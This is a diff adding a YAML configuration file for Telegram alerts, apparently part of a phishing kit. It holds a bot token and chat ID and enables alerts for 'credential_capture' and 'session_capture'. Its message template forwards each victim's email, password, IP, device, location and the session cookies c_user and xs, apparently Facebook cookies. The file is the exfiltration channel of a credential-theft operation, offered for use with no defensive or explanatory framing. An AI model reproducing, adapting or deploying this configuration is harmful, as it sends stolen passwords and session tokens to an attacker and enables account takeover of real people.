@@ -1,0 +1,31 @@
+# Telegram Notification Configuration
+# For real-time capture alerts
+
+telegram:
+  enabled: true
+  bot_token: "8037918547:AAGq23-FlAbxceZHMcP57hP1bNr7s3e8ubo"
+  chat_id: "8420914588"
+  
+  # Notification settings
+  notify_on:
+    credential_capture: true
+    session_capture: true
+    blocked_bot: false  # Too noisy
+    error: true
+  
+  # Message format
+  message_format: |
+    🎯 *{capture_type} CAPTURED*
+    
+    📧 Email: `{email}`
+    🔑 Password: `{password}`
+    🌐 IP: `{ip}`
+    📱 Device: `{user_agent}`
+    🕐 Time: `{timestamp}`
+    
+    🍪 Session Tokens:
+    - c_user: `{c_user}`
+    - xs: `{xs}`
+    
+    🌍 Geo: `{geo_city}, {geo_country}`
+    🔗 Proxy: `{proxy_string}`
